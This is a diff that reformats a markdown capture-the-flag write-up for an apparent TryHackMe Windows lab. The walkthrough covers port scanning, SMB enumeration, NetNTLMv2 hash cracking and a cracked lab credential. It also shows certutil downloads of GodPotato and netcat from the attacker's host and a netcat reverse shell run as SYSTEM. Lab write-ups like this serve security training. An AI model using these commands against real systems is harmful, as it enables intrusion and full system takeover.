@@ -31,6 +31,9 @@ PORT      STATE SERVICE
 49700/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 43.92 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 53,135,139,445,464,6379,9389,49666,49667,49672,49677,49700                                                  
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-01 19:11 UTC
@@ -62,6 +65,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 96.34 secondsd
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10                                                   
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-01 19:14 UTC
@@ -108,6 +114,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 43.72 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbclient -N -L //$IP
 Anonymous login successful
@@ -117,6 +126,9 @@ Anonymous login successful
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.82.180.250 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbmap -H $IP        
 
@@ -131,9 +143,9 @@ Unable to connect with SMB1 -- no workgroup available
 SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                      <https://github.com/ShawnDEvans/smbmap>
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
-[!] Access denied on 10.82.180.250, no fun for you...                                                                        
+[*] Detected 1 hosts serving SMB                  
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                 
+[!] Access denied on 10.82.180.250, no fun for you...                       
 [*] Closed 1 connections
 ```
 
@@ -227,7 +239,10 @@ The following hash-mode match the structure of your input hash:
       # | Name                                                       | Category
   ======+============================================================+======================================
    5600 | NetNTLMv2                                                  | Network Protocol
-┌──(kali㉿kali)-[~/Desktop]                                                                                                              
+```
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]                                      
 └─$ hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -273,6 +288,9 @@ Using the username and the password obtained from hash cracking, I used `smbclie
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.81.142.229 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbmap -H $IP -u enterprise-security -p sand_0873959498    
 
@@ -287,9 +305,8 @@ Unable to connect with SMB1 -- no workgroup available
 SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                      <https://github.com/ShawnDEvans/smbmap>
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
-                                                                                                                             
+[*] Detected 1 hosts serving SMB          
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)         
 [+] IP: 10.81.142.229:445       Name: 10.81.142.229             Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -302,7 +319,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Closed 1 connections
 ```
 
-Inside the share, I found a single PowerShell script named `PurgeIrrelevantData_1826.ps1` . The script simply removes everything inside the `C:\\Users\\Public\\Documents` folder. Based on tis naming convention and functionality, it appears to be a part of a scheduled task.
+Inside the share, I found a single PowerShell script named PurgeIrrelevantData_1826.ps1 . The script simply removes everything inside the C:\\Users\\Public\\Documents folder. Based on tis naming convention and functionality, it appears to be a part of a scheduled task.
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
@@ -315,6 +332,9 @@ smb: \\> dir
 
                 9558271 blocks of size 4096. 4973213 blocks available
 smb: \\> 
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ cat PurgeIrrelevantData_1826.ps1 
 rm -Force C:\\Users\\Public\\Documents\\* -ErrorAction SilentlyContinue
@@ -355,7 +375,7 @@ vulnnet\\enterprise-security
 
 Found `user.txt`
 
-```bash
+```powershell
 PS C:\\Users\\enterprise-security\\Desktop> dir
 
     Directory: C:\\Users\\enterprise-security\\Desktop
@@ -372,7 +392,7 @@ THM{3eb...
 
 I confirmed that the current session has the **SeImpersonatePrivilege** enabled by running `whoami /priv` .
 
-```bash
+```powershell
 PS C:\\Users\\enterprise-security\\Desktop> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -389,12 +409,15 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 To exploit this, I transferred the **GodPotato** exploit and a **Netcat** binary from my local kali machine to the target host.
 
-```bash
+```powershell
 PS C:\\Users\\enterprise-security\\Desktop> certutil -urlcache -split -f <http://192.168.176.157/GodPotato-NET4.exe> gp.exe
 ****  Online  ****
   0000  ...
   e000
 CertUtil: -URLCache command completed successfully.
+```
+
+```powershell
 PS C:\\Users\\enterprise-security\\Desktop> certutil -urlcache -split -f <http://192.168.176.157/nc64.exe> nc.exe
 ****  Online  ****
   0000  ...
@@ -404,7 +427,7 @@ CertUtil: -URLCache command completed successfully.
 
 I confirmed that I could execute commands as the **SYSTEM** user by running the command below.
 
-```bash
+```powershell
 PS C:\\Users\\enterprise-security\\Desktop> .\\gp.exe -cmd "whoami"
 [*] CombaseModule: 0x140735046483968
 [*] DispatchTable: 0x140735048801456
@@ -437,7 +460,7 @@ PS C:\\Users\\enterprise-security\\Desktop> .\\gp.exe -cmd "whoami"
 
 Finally, I executed a reverse shell using **GodPotato** and the **Netcat** binary, which successfully triggered a callback to the listener running on my Kali machine.
 
-```bash
+```powershell
 PS C:\\Users\\enterprise-security\\Desktop> .\\gp.exe -cmd ".\\nc.exe 192.168.176.157 80 -e cmd.exe"
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ rlwrap nc -lvnp 80
@@ -452,7 +475,7 @@ whoami
 
 Found `system.txt`
 
-```bash
+```cmd
 C:\\Users\\Administrator\\Desktop>dir
 dir
  Volume in drive C has no label.
